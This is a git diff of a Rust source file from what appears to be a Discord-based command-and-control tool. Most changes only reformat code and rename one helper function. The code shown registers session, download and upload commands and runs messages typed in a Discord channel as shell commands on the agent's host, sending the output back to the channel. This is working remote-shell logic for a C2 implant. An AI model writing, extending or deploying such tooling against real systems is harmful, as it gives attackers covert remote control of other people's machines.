@@ -7,11 +7,7 @@ use serenity::{
 	model::{
 		application::{
 			command::{Command, CommandOptionType},
-			interaction::application_command::{
-				ApplicationCommandInteraction,
-				CommandDataOption,
-				CommandDataOptionValue,
-			},
+			interaction::application_command::{ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue},
 		},
 		prelude::Message,
 	},
@@ -22,12 +18,7 @@ use tracing::{error, info as informational, warn};
 use crate::{
 	commands::shell::{download, exit, upload},
 	discord_utils::{
-		bot_functions::{
-			send_channel_message,
-			send_code_message,
-			send_edit_response,
-			send_ephemeral_response,
-		},
+		bot_functions::{old_send_edit_response, send_channel_message, send_code_message, send_ephemeral_response},
 		channels::create_text_channel,
 	},
 	errors::DiscordC2Error,
@@ -137,10 +128,7 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
 ///
 /// Note that this function assumes that the `get_or_create_agent` function has already been called and the agent
 /// has been initialized.
-pub async fn run(
-	ctx: &Context,
-	options: &[CommandDataOption],
-) -> Result<(String, Option<ShellType>), DiscordC2Error> {
+pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String, Option<ShellType>), DiscordC2Error> {
 	let mut agent = get_or_create_agent(ctx).await;
 
 	// Checking if the shell type/process was improperly configured
@@ -148,10 +136,7 @@ pub async fn run(
 	if shell_type.is_some() {
 		match ProcessHandler::is_instantiated().await {
 			true => {
-				warn!(
-					"The shell {:?} was already instantiated, what is bro doing?",
-					shell_type
-				);
+				warn!("The shell {:?} was already instantiated, what is bro doing?", shell_type);
 				return Ok((
 					format!(
 						"***Command session has already been initialized in channel <#{}>!***",
@@ -163,10 +148,7 @@ pub async fn run(
 			false => {
 				warn!("Possibly stale session?");
 				*shell_type = None;
-				return Ok((
-					"Hmm... Something went wrong. Possibly a stale session.".to_string(),
-					None,
-				));
+				return Ok(("Hmm... Something went wrong. Possibly a stale session.".to_string(), None));
 			},
 		}
 	}
@@ -195,8 +177,7 @@ pub async fn run(
 	});
 
 	tokio::spawn(async {
-		if let Err(why) = Command::create_global_application_command(ctx2, download::register).await
-		{
+		if let Err(why) = Command::create_global_application_command(ctx2, download::register).await {
 			error!("Failed to register the download command: {:?}", why);
 			return;
 		}
@@ -227,10 +208,7 @@ pub async fn run(
 		}
 	}); // Update the agent's session channel attribute (this also updates the JSON configuration).
 
-	let string = format!(
-		"Successfully created command session channel at <#{}>",
-		session_channel
-	);
+	let string = format!("Successfully created command session channel at <#{}>", session_channel);
 
 	if let CommandDataOptionValue::String(shell_type) = option {
 		let (content, shell) = match shell_type.as_str() {
@@ -296,14 +274,11 @@ pub async fn run(
 /// Note that this function assumes that the `get_or_create_agent` function has already been called and the
 /// agent has been initialized. It also assumes that the `session::run` function returns a message string
 /// followed by an optional `ShellType` object.
-pub async fn session_handler(
-	ctx: &Context,
-	command: &ApplicationCommandInteraction,
-) -> Result<(), DiscordC2Error> {
+pub async fn session_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
 	let response = send_ephemeral_response(ctx, command, "Creating session....", None).await?;
 	let (content, shell) = run(ctx, &command.data.options).await?;
 
-	send_edit_response(ctx, &response, content).await?;
+	old_send_edit_response(ctx, &response, content).await?;
 
 	if shell.is_some() {
 		// Store shell_type in the global variable
@@ -322,12 +297,7 @@ pub async fn command_handler(ctx: &Context, message: &Message) -> Result<(), Err
 		None => {
 			// The session was closed/stale
 			if !message.author.bot {
-				send_channel_message(
-					ctx,
-					message.channel_id,
-					"Stale/expired session. Closing....",
-				)
-				.await?;
+				send_channel_message(ctx, message.channel_id, "Stale/expired session. Closing....").await?;
 				exit::run(ctx).await?;
 			}
 			return Ok(());
@@ -341,19 +311,12 @@ pub async fn command_handler(ctx: &Context, message: &Message) -> Result<(), Err
 			shell.exit().await?;
 			let mut shell_type = SHELL_TYPE.lock().await;
 			*shell_type = None;
-			send_channel_message(
-				ctx,
-				message.channel_id,
-				"Successfully exited session. Use /exit to close the channel.",
-			)
-			.await?;
+			send_channel_message(ctx, message.channel_id, "Successfully exited session. Use /exit to close the channel.").await?;
 		} else {
 			let output = shell.run_command(&message.content).await?;
 			let language_format = shell_type.as_str().replace(".exe", "");
 
-			if let Err(why) =
-				send_code_message(ctx, message.channel_id, &output, &language_format).await
-			{
+			if let Err(why) = send_code_message(ctx, message.channel_id, &output, &language_format).await {
 				println!("{}", why);
 			}
 		}
